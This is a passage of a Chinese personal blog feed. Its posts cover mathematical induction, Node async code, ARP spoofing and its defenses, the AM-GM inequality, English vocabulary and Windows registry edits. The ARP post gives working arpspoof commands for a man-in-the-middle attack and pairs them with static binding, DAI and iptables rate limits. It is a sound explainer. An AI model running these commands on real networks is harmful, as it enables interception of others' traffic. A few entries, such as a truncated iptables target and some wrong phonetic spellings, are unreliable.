<li><p>使用性质：</p>
<ul>
<li><p>对一个已完成上述证明的数学命题，假设并不是所有正整数都成立。</p>
</li>
<li><p>不成立的数所构成的集合S，必定有最小元素k。</p>
<p>Tips: 1不属于集合S 所以 k&gt;1</p>
</li>
<li><p>证明：k已经是集合S中的最小元素了，所以k-1 不属于S，意味着 k-1 命题成立</p>
</li>
<li><p>既然 k-1 成立，那么也对k也应该成立</p>
</li>
<li><p>这与我们第二步骤矛盾，完成两个步骤的命题能够对所有n成立</p>
</li>
<li><p>其他公理和数学归纳法原理的公理化形式是等价的。</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h4 id="归纳法开头"><a href="#归纳法开头" class="headerlink" title="归纳法开头"></a>归纳法开头</h4><p>由归纳法可知，原命题成立 Q.E.D</p>
<hr>
<h4 id="数学名词解释："><a href="#数学名词解释：" class="headerlink" title="数学名词解释："></a>数学名词解释：</h4><ul>
<li><p>Q.E.D：<code>Quod Erat Demonstrandum</code> 意为：证明完毕。</p>
</li>
<li><p>命题：命题是一个陈述，表述了某种数学关系或事实。（所以命题是布尔值？）意味着它们在某个已知的数学体系中可以被证明真或假。</p>
<ul>
<li>所以有真命题，假命题，伪命题？</li>
</ul>
</li>
<li><p>命题成立：</p>
<ul>
<li>意味着已经通过了一种验证，验证方法有：<ul>
<li>逻辑推理</li>
<li>演绎证明</li>
<li>或者某种形式的验证</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>通过验证既为已经证明了它。</p>
<ul>
<li>证明过程：证明过程是严格的推理，根据已知的公理、定义、或已证明的定理进行推导。</li>
</ul>
<hr>
<h4 id="第一数学归纳法"><a href="#第一数学归纳法" class="headerlink" title="第一数学归纳法"></a>第一数学归纳法</h4><p>定义： 第一数学归纳法是一种演绎证明的数学证明方法，通常有三个步骤</p>
<ul>
<li>归纳奠基：证明当 n &#x3D; k0 时命题成立;</li>
<li>归纳假设：假设当 n &#x3D; k 时命题成立;</li>
<li>归纳递推：由归纳假设推出当 n &#x3D; k+1 时，命题也成立；</li>
</ul>
<h4 id="第二数学归纳法"><a href="#第二数学归纳法" class="headerlink" title="第二数学归纳法"></a>第二数学归纳法</h4><ul>
<li>归纳奠基：证明当 n &#x3D; k0 时 命题成立；</li>
<li>归纳假设：假设当 n ≤ k 时 命题成立；</li>
<li>归纳递推：由归纳假设推出当 n &#x3D; k + 1时命题也成立；</li>
</ul>
]]></content>
      <tags>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-2-28-玩Node需要知道的那些事</title>
    <url>/2025/02/28/2025-2-28-%E7%8E%A9Node%E9%9C%80%E8%A6%81%E7%9F%A5%E9%81%93%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    <content><![CDATA[<h3 id="玩-Node-需要知道的那些事"><a href="#玩-Node-需要知道的那些事" class="headerlink" title="玩 Node 需要知道的那些事"></a><strong>玩 Node 需要知道的那些事</strong></h3><h4 id="基本常识"><a href="#基本常识" class="headerlink" title="基本常识"></a><strong>基本常识</strong></h4><h5 id="ECMAScript-是啥？"><a href="#ECMAScript-是啥？" class="headerlink" title="ECMAScript 是啥？"></a><strong>ECMAScript 是啥？</strong></h5><p>ECMAScript（简称 ES）就是 JavaScript 的“官方标准”。它规定了 JavaScript 语言的基本语法，比如 <strong>变量声明（let&#x2F;const）、箭头函数（()&#x3D;&gt;{}）、解构赋值（{ a, b } &#x3D; obj）</strong> 等。</p>
<p>每年 ES 都会更新，比如：</p>
<ul>
<li><strong>ES6（2015）</strong>：let&#x2F;const、箭头函数、Promise、解构赋值</li>
<li><strong>ES7（2016）</strong>：<code>Array.prototype.includes()</code></li>
<li><strong>ES8（2017）</strong>：<code>async/await</code>（超级重要！）</li>
</ul>
<p>如果你听说过 **ES6+**，它指的就是 <strong>ES6 及后续版本的统称</strong>。</p>
<hr>
<h5 id="回调地狱（Callback-Hell）是个啥？"><a href="#回调地狱（Callback-Hell）是个啥？" class="headerlink" title="回调地狱（Callback Hell）是个啥？"></a><strong>回调地狱（Callback Hell）是个啥？</strong></h5><p>回调地狱，就是回调函数套回调函数，再套回调函数……代码一层套一层，像“圣诞树”一样，读起来非常痛苦。😵</p>
<p>比如这个：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">getData</span>(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">processData</span>(result, <span class="function">(<span class="params">newResult</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">saveData</span>(newResult, <span class="function">(<span class="params">finalResult</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;数据保存完成：&quot;</span>, finalResult);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这里嵌套了 <strong>3 层回调</strong>，如果再复杂点，根本没法维护！
这种 <strong>层层嵌套的回调函数</strong>，就叫 <strong>回调地狱（callback hell）</strong></p>
<hr>
<h5 id="Promise-是个啥？"><a href="#Promise-是个啥？" class="headerlink" title="Promise 是个啥？"></a><strong>Promise 是个啥？</strong></h5><p>为了解决回调地狱，ES6 引入了 <strong>Promise</strong>，它让代码更清晰，支持 <code>.then()</code> 和 <code>.catch()</code> 链式调用，比如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">getData</span>()</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">result</span>) =&gt;</span> <span class="title function_">processData</span>(result))</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">newResult</span>) =&gt;</span> <span class="title function_">saveData</span>(newResult))</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">finalResult</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;数据保存完成：&quot;</span>, finalResult))</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;出错了&quot;</span>, err));</span><br></pre></td></tr></table></figure>

<p>是不是比回调地狱清爽多了？ 😆</p>
<p>但 <strong>Promise</strong> 还是有些 <strong>链式嵌套</strong> 的问题，所以……</p>
<hr>
<h5 id="async-await：异步编程的终极方案"><a href="#async-await：异步编程的终极方案" class="headerlink" title="async&#x2F;await：异步编程的终极方案"></a><strong>async&#x2F;await：异步编程的终极方案</strong></h5><p>ES8（2017） 引入了 <code>async/await</code>，它 <strong>彻底解决了回调地狱</strong>，让代码看起来像同步执行一样！</p>
<p>🚀 <strong>改造后：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">getData</span>();</span><br><span class="line">    <span class="keyword">const</span> newResult = <span class="keyword">await</span> <span class="title function_">processData</span>(result);</span><br><span class="line">    <span class="keyword">const</span> finalResult = <span class="keyword">await</span> <span class="title function_">saveData</span>(newResult);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;数据保存完成：&quot;</span>, finalResult);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;出错了&quot;</span>, err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>是不是超级直观！</strong> 🎉
用 <code>await</code> 让 <strong>异步代码变得像同步代码一样</strong>，可读性、可维护性 <strong>爆炸提升</strong>！</p>
<hr>
<h5 id="使用-Prisma：数据库操作神器"><a href="#使用-Prisma：数据库操作神器" class="headerlink" title="使用 Prisma：数据库操作神器"></a><strong>使用 Prisma：数据库操作神器</strong></h5><p>写 <strong>Node.js + 数据库</strong> 时，传统的 MySQL 需要写 SQL 语句，太麻烦了！
于是，Prisma 作为 <strong>现代 ORM（对象关系映射）</strong> 出现了！ 🎯</p>
<p>🚀 <strong>用 Prisma 查询数据库</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">PrismaClient</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@prisma/client&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> prisma = <span class="keyword">new</span> <span class="title class_">PrismaClient</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> users = <span class="keyword">await</span> prisma.<span class="property">user</span>.<span class="title function_">findMany</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(users);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure>

<p><strong>不用写 SQL</strong>，直接用 <strong>JavaScript 代码</strong> 操作数据库，<strong>简洁、高效、类型安全</strong>，真香！ 😍</p>
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>TypeScript</tag>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-3-1-ARP协议与攻击防护</title>
    <url>/2025/03/01/2025-3-1-ARP%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%94%BB%E5%87%BB%E9%98%B2%E6%8A%A4/</url>
    <content><![CDATA[<h4 id="ARP工作原理"><a href="#ARP工作原理" class="headerlink" title="ARP工作原理"></a>ARP工作原理</h4><p><strong>地址解析协议（ARP, Address Resolution Protocol）</strong> 是 TCP&#x2F;IP 网络中的关键协议，它用于将 <strong>IP 地址解析为 MAC 地址</strong>，以便设备能够在本地网络中通信。</p>
<p>ARP 的基本工作流程如下：</p>
<ol>
<li><p><strong>主机 A 发送 ARP 请求（广播）</strong></p>
<ul>
<li><p>当主机 A 需要知道目标主机 B 的 MAC 地址时，它会发送一个 <strong>ARP 请求</strong>，广播到整个子网，格式如下：</p>
<p><code>谁是 192.168.1.2？请告诉 192.168.1.1</code></p>
</li>
</ul>
</li>
</ol>
<p>​	2.<strong>目标主机 B 发送 ARP 响应（单播）</strong></p>
<ul>
<li>目标主机 B（192.168.1.2）收到 ARP 请求后，查找自己的 IP 地址，并返回一个 <strong>ARP 响应</strong>，将自己的 MAC 地址发回给主机 A。</li>
</ul>
<ol start="3">
<li><strong>主机 A 存储 ARP 映射</strong></li>
</ol>
<ul>
<li>主机 A <strong>收到 ARP 响应后，会将目标主机 B 的 IP 和 MAC 地址存入 ARP 缓存表（ARP Cache）</strong>，避免重复查询，提高效率</li>
</ul>
<p><strong>示例：查看当前 ARP 缓存表</strong></p>
<p><code>arp -a</code></p>
<h4 id="APR欺骗攻击"><a href="#APR欺骗攻击" class="headerlink" title="APR欺骗攻击"></a>APR欺骗攻击</h4><p>ARP 没有身份验证机制，因此攻击者可以伪造 ARP 响应，欺骗网络中的其他设备，将流量重定向到自己，从而进行 <strong>中间人攻击（MITM, Man-In-The-Middle）</strong> 或者 <strong>流量窃听</strong>。</p>
<p> <strong>ARP 欺骗的基本原理</strong></p>
<ol>
<li>攻击者伪造 ARP 响应，将 <strong>网关的 MAC 地址修改为自己的 MAC 地址</strong>，让受害者将数据发送给攻击者。</li>
<li>攻击者同时向网关发送伪造的 ARP 响应，冒充受害者 IP 地址，使网关误以为攻击者是受害者。</li>
<li>受害者与网关之间的通信都会经过攻击者，攻击者可以窃听、篡改或转发数据。</li>
</ol>
<h5 id="执行-ARP-欺骗攻击"><a href="#执行-ARP-欺骗攻击" class="headerlink" title="执行 ARP 欺骗攻击"></a><strong>执行 ARP 欺骗攻击</strong></h5><p>在 <strong>Kali Linux</strong> 上使用 <code>arpspoof</code> 进行 ARP 欺骗攻击：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 让目标 192.168.1.100 认为攻击者是网关 192.168.1.1</span></span><br><span class="line">arpspoof -i eth0 -t 192.168.1.100 192.168.1.1</span><br><span class="line"><span class="comment"># 让网关 192.168.1.1 认为攻击者是目标 192.168.1.100</span></span><br><span class="line">arpspoof -i eth0 -t 192.168.1.1 192.168.1.100</span><br></pre></td></tr></table></figure>

<p>执行后，攻击者就成为了受害者和网关之间的“中间人”，可以拦截所有数据。</p>
<h4 id="ARP攻击局限"><a href="#ARP攻击局限" class="headerlink" title="ARP攻击局限"></a>ARP攻击局限</h4><p>ARP 欺骗的主要局限性是 <strong>只能在同一广播域（同一局域网）内生效</strong>，因为 ARP 数据包不会跨越路由器。</p>
<ul>
<li>如果攻击者和受害者不在同一网段，ARP 欺骗攻击 <strong>无法直接生效</strong>。</li>
<li>但如果可以 <strong>近源渗透</strong>（例如 WiFi 入侵、获取 VPN 接入权限），攻击者仍可以利用 ARP 欺骗进行攻击。</li>
</ul>
<h4 id="ARP欺骗攻击防御"><a href="#ARP欺骗攻击防御" class="headerlink" title="ARP欺骗攻击防御"></a>ARP欺骗攻击防御</h4><p>由于 ARP <strong>本身没有安全机制</strong>，所以需要采取额外的防护措施。</p>
<p> <strong>1. 使用 ARP 静态绑定</strong></p>
<p>最有效的防御方法是使用 <strong>静态 ARP 绑定</strong>，手动将 IP 绑定到正确的 MAC 地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在 Windows 上永久绑定网关 IP 和 MAC 地址</span></span><br><span class="line">arp -s 192.168.1.1 aa-bb-cc-dd-ee-ff</span><br></pre></td></tr></table></figure>

<p>在 Linux&#x2F;macOS 上：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ip neigh add 192.168.1.1 lladdr aa:bb:cc:<span class="built_in">dd</span>:ee:ff dev eth0 nud permanent</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong></p>
<ul>
<li><strong>静态绑定适用于小型网络</strong>，但在大型企业网络中维护难度较高。</li>
</ul>
<p><strong>2. 启用动态 ARP 检测（DAI）</strong></p>
<p><strong>企业级交换机</strong>（如 Cisco、H3C）支持 <strong>动态 ARP 检测（DAI, Dynamic ARP Inspection）</strong>，可以防止 ARP 欺骗：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip arp inspection vlan 10</span><br></pre></td></tr></table></figure>

<p><strong>3. 使用防火墙检测 ARP 攻击</strong></p>
<p>许多 <strong>防火墙</strong>（如 <code>iptables</code>）可以监测 ARP 异常流量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p arp --arp-opcode Request -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 5/s -j ACCEPT</span><br><span class="line">iptables -A INPUT -p arp --arp-opcode Request -j DRO</span><br></pre></td></tr></table></figure>

<p>这样可以限制 ARP 请求的频率，减少 ARP 洪水攻击的风险。</p>
<h4 id="高级攻击-ARP洪水"><a href="#高级攻击-ARP洪水" class="headerlink" title="高级攻击-ARP洪水"></a>高级攻击-ARP洪水</h4><p>ARP 洪水攻击（ARP Flooding）是一种 <strong>DoS（拒绝服务）攻击</strong>，攻击者不断发送大量伪造的 ARP 包，使交换机的 <strong>ARP 表溢出</strong>，导致：</p>
<ul>
<li>交换机无法正确解析 MAC 地址，进入 <strong>Hub 模式</strong>，导致所有流量广播，增加网络拥塞。</li>
<li>攻击者可以监听大量流量，从而获取敏感信息。</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>| <strong>攻击类型</strong>           | <strong>描述</strong>                                           | <strong>防御方法</strong>                                    |
| ———————- | ————————————————– | ———————————————– |
| <strong>ARP 欺骗</strong>           | 伪造网关&#x2F;目标 IP 的 MAC 地址，进行流量劫持         | <strong>静态 ARP 绑定</strong>，启用 <strong>DAI</strong>，使用防火墙检测 |
| <strong>ARP 洪水</strong>           | 发送大量 ARP 数据包，导致交换机崩溃或进入 Hub 模式 | 限制 ARP 请求速率，使用防火墙规则               |
| <strong>MITM（中间人攻击）</strong> | 拦截受害者与网关的流量，进行监听或数据篡改         | <strong>SSL&#x2F;TLS 加密</strong>，使用 VPN，使用静态 ARP        |</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a><strong>结论</strong></h2><ul>
<li>ARP 协议是 <strong>无状态的，没有安全机制</strong>，容易受到欺骗攻击。</li>
<li><strong>ARP 欺骗</strong> 可以用于 <strong>流量劫持、监听、数据篡改</strong>，但需要在同一广播域内。</li>
<li><strong>ARP 洪水</strong> 可以 <strong>让交换机进入 Hub 模式，监听整个网络</strong>。</li>
<li><strong>防御方法包括</strong>：静态 ARP 绑定、启用动态 ARP 检测（DAI）、使用防火墙过滤异常流量。</li>
</ul>
]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-3-1-均值不等式学习</title>
    <url>/2025/03/01/2025-3-1-%E5%9D%87%E5%80%BC%E4%B8%8D%E7%AD%89%E5%BC%8F%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="认识"><a href="#认识" class="headerlink" title="认识"></a>认识</h4><p>什么是均值不等式呢？</p>
<p><strong>平均数不等式</strong>，或称<strong>平均值不等式</strong>、<strong>均值不等式</strong>，是数学上的一组<a href="https://zh.wikipedia.org/wiki/%E4%B8%8D%E7%AD%89%E5%BC%8F">不等式</a>，也是算术-几何平均值不等式的推广。它是说：</p>
<p>​                                                                                                                                <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/82e67c40f94418803bdd85bffe13d9d952c73419"></p>
<p>​     <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/2a31a799492ab08ebc287ec8a87ac558b93a92f9"></p>
<p>— wikipedia.org</p>
<h2 id="证明方法"><a href="#证明方法" class="headerlink" title="证明方法"></a>证明方法</h2><p>关于均值不等式的证明方法有很多，<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E5%AD%A6%E5%BD%92%E7%BA%B3%E6%B3%95">数学归纳法</a>（第一数学归纳法或反向归纳法）、<a href="https://zh.wikipedia.org/wiki/%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E4%B9%98%E6%95%B0">拉格朗日乘数</a>法、<a href="https://zh.wikipedia.org/wiki/%E7%90%B4%E7%94%9F%E4%B8%8D%E7%AD%89%E5%BC%8F">琴生不等式</a>法、<a href="https://zh.wikipedia.org/wiki/%E6%8E%92%E5%BA%8F%E4%B8%8D%E7%AD%89%E5%BC%8F">排序不等式</a>法、<a href="https://zh.wikipedia.org/wiki/%E6%9F%AF%E8%A5%BF%E4%B8%8D%E7%AD%89%E5%BC%8F">柯西不等式</a>法等等，都可以证明均值不等式，在这里简要介绍数学归纳法证明n维形式的均值不等式的方法</p>
]]></content>
      <tags>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-3-4-消灭英语高频词</title>
    <url>/2025/03/04/2025-3-4-%E6%B6%88%E7%81%AD%E8%8B%B1%E8%AF%AD%E9%AB%98%E9%A2%91%E8%AF%8D/</url>
    <content><![CDATA[<h3 id="今日高频词"><a href="#今日高频词" class="headerlink" title="今日高频词"></a>今日高频词</h3><p>| 单词   | 词意   | 音标        |
| —— | —— | ———– |
| get    | 得到   | <code>/get/</code>     |
| take   | 拿     | <code>/taIm/</code>    |
| time   | 时间   | <code>/Taim/</code>    |
| make   | 做     | <code>/Meik/</code>    |
| know   | 知道   | <code>/neu/</code>     |
| see    | 看见   | <code>/si/</code>      |
| help   | 帮助   | <code>/help/</code>    |
| find   | 找到   | <code>/faind/</code>   |
| other  | 其他   | <code>/ʌðə(r)/</code>  |
| work   | 工作   | <code>/wɜːk/</code>    |
| look   | 看     | <code>/lʊk/</code>     |
| give   | 给     | <code>/ɡɪv/</code>     |
| come   | 来     | <code>/kʌm/</code>     |
| need   | 需要   | <code>/niːd/</code>    |
| last   | 最后的 | <code> /lɑːst/</code>  |
| talk   | 谈话   | <code>/tɔːk/</code>    |
| start  | 开始   | <code>/stɑːt/</code>   |
| ask    | 提问   | <code>/ɑːsk/</code>    |
| way    | 方式   | <code>/weɪ/</code>     |
| place  | 地方   | <code>/pleɪs/</code>   |
| learn  | 学习   | <code>/lɜːn/</code>    |
| use    | 使用   | <code> /juːz/</code>   |
| call   | 打电话 | <code> /kɔːl/</code>   |
| feel   | 感觉   | <code> /fiːl/</code>   |
| leave  | 离开   | <code>/liːv/</code>    |
| change | 改变   | <code>/tʃeɪndʒ/</code> |
| life   | 生活   | <code>/laɪf/</code>    |
| try    | 尝试   | <code>/traɪ/</code>    |
| only   | 只有   | <code>/ˈəʊnli/</code>  |
| tell   | 告诉   | <code>/tel/</code>     |</p>
<hr>
<h4 id="用法整理"><a href="#用法整理" class="headerlink" title="用法整理"></a>用法整理</h4><p>| get up                | get along        | get over             |
| ——————— | —————- | ——————– |
| take care             | take break       | take part            |
| in time               | take your time   | out of time          |
| make a decision       | make a mistake   | make progress        |
| know well             | I don’t know     | know by heart        |
| see you               | see a doctor     | see through          |
| help out              | help with        | lend a hand          |
| find out              | find a solution  | find time            |
| on the other hand     | in other words   | the other way around |
| work hard             | work out         | work together        |
| look after            | look for         | look forward to      |
| give up               | give a hand      | give it a try        |
| come on               | come in          | come up with         |
| need help             | no need to       | need for             |
| last year             | last longer      | at last              |
| talk to               | talk about       | talk over            |
| start over            | start with       | start out            |
| ask for               | ask about        | ask around           |
| by the way            | in a way         | no way               |
| take place            | in place         | out of place         |
| learn about           | learn form       | learn by heart       |
| use up                | make use of      | used of              |
| call back             | call for         | call on              |
| feel like             | feel bad         | feel free            |
| leave behind          | leave for        | leave out            |
| change clothes        | change your mind | change the subject   |
| the rest of your life | for life         | life goes on         |
| try out               | try your best    | try on               |
| only time             | not only         | only way             |
| tell the truth        | tell a story     | tell someone         |</p>
]]></content>
      <tags>
        <tag>英语</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-3-4-数据库技巧小记</title>
    <url>/2025/03/04/2025-3-4-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8A%80%E5%B7%A7%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="修复过程"><a href="#修复过程" class="headerlink" title="修复过程"></a>修复过程</h4><p>测试的时候id脸滚键盘乱敲又把 <code>AUTO_INCREMENT</code> 搞绷了</p>
<p>问了下GPT，告诉我可以用<code>ALTER TABLE table_name AUTO_INCREMENT = xxx;</code> 来修复</p>
<p>ps：并不是因为值设置过小哦</p>
<p>试了很多次根本没用</p>
<p>苦找之下发现一个方法</p>
<p><code>navicat </code>连接后先取消递增，然后保存，再把递增开，会让<code>AUTO_INCREMENT </code>初始化</p>
<p><strong>等价 SQL 语句</strong>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> task MODIFY <span class="keyword">COLUMN</span> id <span class="type">INT</span>;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> task MODIFY <span class="keyword">COLUMN</span> id <span class="type">INT</span> AUTO_INCREMENT;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>SQL</tag>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-3-11-数论基础</title>
    <url>/2025/03/11/2025-3-11-%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h3 id="数论基础"><a href="#数论基础" class="headerlink" title="数论基础"></a>数论基础</h3><p>本文为学习 初等数论(第三版) (潘承洞, 潘承彪) 的学习笔记</p>
<p><em>基本性质</em>：研究整数</p>
<p>base: 整除理论 - 带余数除法</p>
<p>整除理论中心内容：算术基本定理和最大公约数理论。</p>
]]></content>
      <tags>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-3-5-我学了什么数学?</title>
    <url>/2025/03/05/2025-3-5-%E6%88%91%E5%AD%A6%E4%BA%86%E4%BB%80%E4%B9%88%E6%95%B0%E5%AD%A6/</url>
    <content><![CDATA[<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h4 id="均值不等式"><a href="#均值不等式" class="headerlink" title="均值不等式"></a>均值不等式</h4><p><a href="https://zh.wikipedia.org/wiki/%E8%B0%83%E5%92%8C%E5%B9%B3%E5%9D%87%E6%95%B0">调和平均数</a> ≤ <a href="https://zh.wikipedia.org/wiki/%E5%87%A0%E4%BD%95%E5%B9%B3%E5%9D%87%E6%95%B0">几何平均数</a> ≤ <a href="https://zh.wikipedia.org/wiki/%E7%AE%97%E6%9C%AF%E5%B9%B3%E5%9D%87%E6%95%B0">算术平均数</a> ≤ <a href="https://zh.wikipedia.org/wiki/%E5%B9%B3%E6%96%B9%E5%B9%B3%E5%9D%87%E6%95%B0">平方平均数</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	![&#123;\displaystyle H_&#123;n&#125;=&#123;\dfrac &#123;n&#125;&#123;\displaystyle \sum _&#123;i=1&#125;^&#123;n&#125;&#123;\dfrac &#123;1&#125;&#123;x_&#123;i&#125;&#125;&#125;&#125;&#125;=&#123;\dfrac &#123;n&#125;&#123;&#123;\dfrac &#123;1&#125;&#123;x_&#123;1&#125;&#125;&#125;+&#123;\dfrac &#123;1&#125;&#123;x_&#123;2&#125;&#125;&#125;+\cdots +&#123;\dfrac &#123;1&#125;&#123;x_&#123;n&#125;&#125;&#125;&#125;&#125;&#125;]</span><br><span class="line"></span><br><span class="line">![&#123;\displaystyle A_&#123;n&#125;=&#123;\dfrac &#123;\displaystyle \sum _&#123;i=1&#125;^&#123;n&#125;x_&#123;i&#125;&#125;&#123;n&#125;&#125;=&#123;\dfrac &#123;x_&#123;1&#125;+x_&#123;2&#125;+\cdots +x_&#123;n&#125;&#125;&#123;n&#125;&#125;&#125;]</span><br><span class="line"></span><br><span class="line">![&#123;\displaystyle G_&#123;n&#125;=&#123;\sqrt[&#123;n&#125;]&#123;\prod _&#123;i=1&#125;^&#123;n&#125;x_&#123;i&#125;&#125;&#125;=&#123;\sqrt[&#123;n&#125;]&#123;x_&#123;1&#125;x_&#123;2&#125;\cdots x_&#123;n&#125;&#125;&#125;&#125;]</span><br><span class="line"></span><br><span class="line">![&#123;\displaystyle Q_&#123;n&#125;=&#123;\sqrt &#123;\dfrac &#123;\displaystyle \sum _&#123;i=1&#125;^&#123;n&#125;x_&#123;i&#125;^&#123;2&#125;&#125;&#123;n&#125;&#125;&#125;=&#123;\sqrt &#123;\dfrac &#123;x_&#123;1&#125;^&#123;2&#125;+x_&#123;2&#125;^&#123;2&#125;+\cdots +x_&#123;n&#125;^&#123;2&#125;&#125;&#123;n&#125;&#125;&#125;&#125;]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="放缩"><a href="#放缩" class="headerlink" title="放缩"></a>放缩</h4><p>放缩技巧：</p>
<pre><code>- 裂项
- 常量替换
</code></pre>
<p>假设有 a + b &gt; 2 (根号 ab)</p>
<p>a&#x2F;2 的情况</p>
<h4 id="取等条件"><a href="#取等条件" class="headerlink" title="取等条件"></a>取等条件</h4><p>注意 a &amp; b</p>
<h4 id="公式化的数学证明"><a href="#公式化的数学证明" class="headerlink" title="公式化的数学证明"></a>公式化的数学证明</h4><h4 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h4><h4 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h4><h4 id="排列"><a href="#排列" class="headerlink" title="排列"></a>排列</h4><h4 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h4>]]></content>
      <tags>
        <tag>数学</tag>
        <tag>数学分析</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-4-2-修改注册表实现更改默认文件打开方式</title>
    <url>/2025/04/02/2025-4-2-%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AE%9E%E7%8E%B0%E6%9B%B4%E6%94%B9%E9%BB%98%E8%AE%A4%E6%96%87%E4%BB%B6%E6%89%93%E5%BC%80%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h3 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h3><p>首先打开注册表</p>
<p>然后在修改文件路由路径</p>
<h4 id="第一处"><a href="#第一处" class="headerlink" title="第一处"></a>第一处</h4><p><code>HKEY_CLASSES_ROOT\.[扩展名]</code></p>
<p>例如：</p>
<p><code>HKEY_CLASSES_ROOT\.md</code></p>
<p>从这里可以看到文件的默认类型</p>
<p>markdown应该是 <code>Markdown File</code>  ~~我的使用中默认类型是未设置的~~</p>
<h4 id="第二处"><a href="#第二处" class="headerlink" title="第二处"></a>第二处</h4><p>由上得出</p>
<p>修改第二处的路径则是在</p>
<p><code>计算机\HKEY_CLASSES_ROOT\Markdown File\shell\open\command</code></p>
<p><code>shell open command </code> 意义非常显然 不多赘述</p>
<p>我将 <code>command</code> 的值设置为 <code>&quot;D:\CTFINFO\Typora\Typora.exe&quot; &quot;%1&quot;</code> (请替换为你自己的路径)</p>
<p>就此完成了修改</p>
]]></content>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-4-2-链式队列</title>
    <url>/2025/04/02/2025-4-2-%E9%93%BE%E5%BC%8F%E9%98%9F%E5%88%97/</url>
